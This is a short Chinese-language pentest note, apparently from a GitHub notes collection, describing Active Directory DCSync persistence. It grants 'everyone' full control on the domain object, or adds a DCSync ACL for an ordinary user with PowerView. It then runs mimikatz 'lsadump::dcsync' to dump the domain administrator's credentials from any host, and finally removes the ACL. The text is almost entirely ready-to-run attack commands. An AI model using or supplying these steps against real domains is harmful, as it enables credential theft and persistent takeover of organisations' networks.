	服务器管理器找到域->查看->启用高级功能->右键属性->安全->everyone完全控制
	>mimikatz.exe "lsadump::dcsync /domain:zone.com /user:administrator" exit
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/498.png)

	或使用powerview添加一条ACL(域控执行)
	>Add-DomainObjectAcl -TargetIdentity "DC=ZONE,DC=COM" -PrincipalIdentity 域内用户 -Rights DCSync -Verbose 
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/499.png)

	使用此账户在域内任意主机可使用mimikatz的dcsync功能导出凭据
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/500.png)

	移除ACL
	>Remove-DomainObjectAcl -TargetIdentity "DC=zone,DC=com" -PrincipalIdentity 用户 -Rights DCSync -Verbose